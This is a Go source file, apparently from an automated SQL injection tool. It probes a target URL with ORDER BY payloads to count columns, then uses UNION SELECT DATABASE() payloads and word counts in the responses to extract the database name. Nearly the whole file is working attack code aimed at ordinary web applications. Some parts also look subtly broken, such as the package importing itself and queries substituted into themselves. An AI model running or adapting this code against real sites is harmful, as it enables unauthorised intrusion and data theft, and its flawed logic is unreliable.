package helper

import (
	"GoInjection/helper"
	"GoInjection/structs"
	"fmt"
	"regexp"
	"strings"
)

func GetColumnCount(url string) (bool, int) {
	var query = "' ORDER BY %d--+"

	for i := 1; i <= 15; i++ {
		payload := fmt.Sprintf(query, i)
		response, _ := helper.SendRequest(url + helper.URLEncodeQuery(payload))

		if strings.Contains(strings.ToLower(response), "unknown column") {
			return true, i
		}
	}

	return false, 0
}

// ToDo: Add Error/Blind-based injection detection
func GetDatabase(url string, maxColumns int) (bool, string) {
	var query string
	var databaseStr = "DATABASE()"
	var querySuffix string

	switch structs.TargetSyntax {
	case "MySQL", "PostgresSQL":
		querySuffix = " --+"
	case "MsSQL", "SQLite":
		querySuffix = " --"
	default:
		querySuffix = " --+"
	}
	query = "' UNION SELECT " + strings.Repeat(databaseStr+",", maxColumns-2) + databaseStr + querySuffix

	response, _ := helper.SendRequest(url + helper.URLEncodeQuery(strings.ReplaceAll(query, helper.PayloadReplaceString, query)))

	var database string

	words1 := CountWords(response)
	for word, count := range words1 {
		if count == maxColumns-1 {
			database = word

		}
	}

	query = strings.ReplaceAll(query, databaseStr, "NULL")
	query = strings.ReplaceAll(query, ",NULL,", fmt.Sprintf(",%s,", databaseStr))
	query = strings.ReplaceAll(query, helper.PayloadReplaceString, query)
	response2, _ := helper.SendRequest(url + helper.URLEncodeQuery(strings.ReplaceAll(query, helper.PayloadReplaceString, query)))

	words2 := CountWords(response2)
	for word, count := range words2 {
		if count == 1 {
			if word == database {
				structs.TargetDatabaseName = database
				return true, database
			}
		}
	}

	return false, ""
}

func CountWords(response string) map[string]int {
	response = strings.ToLower(response)

	re := regexp.MustCompile(`\w+`)
	words := re.FindAllString(response, -1)

	wordCounts := make(map[string]int)
	for _, word := range words {
		wordCounts[word]++
	}

	return wordCounts
}
